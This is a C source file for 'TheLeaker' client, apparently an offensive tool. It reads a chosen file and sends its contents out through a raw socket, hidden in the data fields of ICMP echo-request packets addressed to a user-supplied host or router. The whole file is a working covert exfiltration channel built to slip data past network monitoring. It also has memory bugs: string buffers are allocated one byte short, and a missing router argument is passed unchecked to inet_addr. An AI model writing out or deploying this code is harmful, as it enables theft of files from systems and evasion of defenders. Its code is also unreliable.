#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include "iphdr.h"
#include "icmphdr.h"

#define MAX_PACKET (int)1024
#define MAX_FILE_NAME (int)255
#define MAX_HOST_NAME (int)255
#define MAX_ICMP_DATA (int)(MAX_PACKET - sizeof(struct icmphdr) - sizeof(struct iphdr) - strlen(filename))

char *filename = NULL;
char *file_rename = NULL;
char *hostname = NULL;
char *router = NULL;

void help();
int get_opt(int, char**);

int main(int argc, char **argv){
	FILE *leak_file;
	int sockfd, file_size, qty_packet, readed_bytes, counter, optval = 1;
	char buffer[MAX_PACKET];
	struct sockaddr_in to;
	iphdr *ip;
	icmphdr *icmp;
	ip = (struct iphdr *)buffer;
	icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));
	get_opt(argc, argv);
	if(hostname == NULL || filename == NULL){
		help();
		return 1;	
	}
	if(file_rename == NULL){
		for(int i = strlen(filename) -2; i >= 0; i--){
			if(filename[i] == '\\' || filename[i] == '/'){
				file_rename = calloc(strlen(&filename[i]), sizeof(char));
				strcpy(file_rename, &filename[i+1]);
				break;
			}
		}
		if(file_rename == NULL){
			file_rename = calloc(strlen(filename), sizeof(char));
			strcpy(file_rename, filename);
		}
	}
	leak_file = fopen(filename, "rb");
	if(leak_file == NULL){
		perror("fopen() Failed");
		return 1;
	}
	fseek(leak_file, 0, SEEK_END);
	file_size = ftell(leak_file);
	fseek(leak_file, 0, SEEK_SET);
	if(file_size == 0){
		fprintf(stderr, "Zero bytes in the file: %s\n", filename);
		return 1;
	}
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(sockfd == -1){
		perror("socket() Failed");
		return 1;
	}
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1){
		perror("setsockopt() Failed");
		return 1;
	}
	qty_packet = (int)ceil( ((float)file_size) / MAX_ICMP_DATA );
	printf("*************** TheLeaker ***************\n");
	printf("***************** Client ****************\n");
        printf("Leak File: %s\nFile Size: %d\nRename as: %s\nSend To: %s\nRouter To: %s\nMax Data: %d\nTotal Packet: %d\n",  filename, file_size,  file_rename, hostname, router, MAX_ICMP_DATA, qty_packet);
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->id = 0;
	ip->ffo = 0;
	ip->ttl = 127;
	ip->protocol = 1; // ICMP
	ip->src_addr = 0;
	ip->dst_addr = inet_addr(router);
	icmp->type = 8;
	icmp->code = 0;
	icmp->id = 0;
	icmp->seq = 0;
	icmp->fnz = strlen(file_rename); // The size of filename
	strcpy(icmp->data, file_rename);
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = ip->dst_addr;
	readed_bytes = 1;
	counter = 0;	
	for(counter = 0; counter < qty_packet; counter++){
		memset(icmp->data + icmp->fnz, 0, MAX_ICMP_DATA); 
		ip->checksum = 0;
		icmp->checksum = 0;
		icmp->seq++;
		readed_bytes = fread(icmp->data + icmp->fnz, sizeof(char), MAX_ICMP_DATA, leak_file);
		ip->t_len = sizeof(struct icmphdr) + sizeof(struct iphdr) + readed_bytes + icmp->fnz;
		ip->checksum = ip_checksum(ip);
		icmp->checksum = icmp_checksum(icmp, readed_bytes + icmp->fnz);
		int bytes = sendto(sockfd, buffer, ip->t_len, 0, (struct sockaddr *)&to, sizeof(to));
		if(bytes > 0){ 
			printf("\rSend packet %d/%d (%d/%d bytes)",counter+1,qty_packet, (MAX_ICMP_DATA * counter) + readed_bytes, file_size);
		}else{
			printf("Failed to send the packet, %d (bytes) was sent.\n", bytes);
			break;
		}
		fflush(stdout);
	}
	fclose(leak_file);
	return 0;
}

void help(){
	printf("theleaker -s [target] -f [filename] -R [Router ip] -r [rename file]\n");
}
int get_opt(int argc, char **argv){
	for(int i = 1; i < argc; i++){
		if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0){
			help();
			return 1;
		}else if(strcmp(argv[i],"-f") == 0 || strcmp(argv[i], "--filename") == 0){
			if (i + 1 >= argc){
				fprintf(stderr, "You must inform the filename.\n");
				return 1;
			}
			if(strlen(argv[i+1]) >= MAX_FILE_NAME){
				fprintf(stderr, "The file name size must be less than 255.\n");
				return 1;
			}
			filename = calloc(strlen(argv[i+1]), sizeof(char));
			strcpy(filename, argv[++i]);
		}else if(strcmp(argv[i],"-s") == 0 || strcmp(argv[i], "--sendto") == 0){
			if(i + 1 >= argc){
				fprintf(stderr, "You must inform the hostname\n.");
				return 1;
			}
			hostname = calloc(strlen(argv[i+1]), sizeof(char));
			strcpy(hostname, argv[++i]);
		}else if(strcmp(argv[i],"-r") == 0 || strcmp(argv[i], "--rename") == 0){
			if (i + 1 >= argc){
                                fprintf(stderr, "You must inform the new file name.\n");
                                return 1;
                        }
                        if(strlen(argv[i+1]) >= MAX_FILE_NAME){
                                fprintf(stderr, "The file name size must be less than 255.\n");
                                return 1;
                        }
			file_rename = calloc(strlen(argv[i+1]), sizeof(char));
                        strcpy(file_rename, argv[++i]);
		}else if(strcmp(argv[i],"-R") == 0 || strcmp(argv[i], "--router") == 0){
			if (i + 1 >= argc){
                                fprintf(stderr, "You must inform the IP to route.\n");
                                return 1;
                        }
                        if(strlen(argv[i+1]) >= 16){
                                fprintf(stderr, "Invalid router IP.\n");
                                return 1;
                        }
			router = calloc(strlen(argv[i+1]), sizeof(char));
                        strcpy(router, argv[++i]);
		}
	}
	return 0;
}
